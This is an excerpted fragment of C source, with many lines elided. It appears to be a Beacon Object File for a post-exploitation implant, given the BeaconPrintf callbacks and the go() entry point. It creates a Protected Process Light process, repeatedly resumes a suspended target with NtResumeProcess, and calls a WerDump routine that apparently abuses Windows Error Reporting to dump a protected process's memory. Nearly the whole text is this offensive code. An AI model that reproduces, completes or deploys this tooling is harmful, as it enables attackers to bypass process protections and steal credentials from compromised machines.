...
BOOL CreatePPLProcess(DWORD Plevel, char *Path)
{
    ...
    if (!KERNEL32$UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL, &Plevel, sizeof(Plevel), NULL, NULL))
    {
...
DWORD WINAPI ResumeProcess(LPVOID lpParameter)
{
    ...
    if (!hProcess)
    {
        BeaconPrintf(CALLBACK_ERROR, "[!] Failed to open process with PROCESS_SUSPEND_RESUME. Error: %d\n", KERNEL32$GetLastError());
        return 1;
    }

    for (int i = 0; i < 10; ++i)
    {
        KERNEL32$Sleep(1000); // Optional: small delay between calls
        NTSTATUS STATUS = NTDLL$NtResumeProcess(hProcess);
        if (STATUS != 0)
        {
            BeaconPrintf(CALLBACK_ERROR, "[!] Failed to resume process, retrying... \n");
        }
        else
        {
...
DWORD WerDump(DWORD dwProcessTid, DWORD dwProcessId, char werPath[MAX_PATH], char werDump[MAX_PATH], unsigned char werSig[MAX_PATH])
{
    ...
    DWORD dwThreadId;
    HANDLE hThreadId = KERNEL32$CreateThread(NULL, 0, ResumeProcess, (LPVOID)(ULONG_PTR)dwProcessId, 0, &dwThreadId);
    if (!hThreadId)
    {
    ...
    KERNEL32$WaitForSingleObject(hThreadId, INFINITE);
...
void go(IN PCHAR args, IN ULONG argc)
{
    ...
    if (dwProcessTid == 0)
    {
        BeaconPrintf(CALLBACK_ERROR, "[+] Failed to get main thread ID\n");
        return;
    }
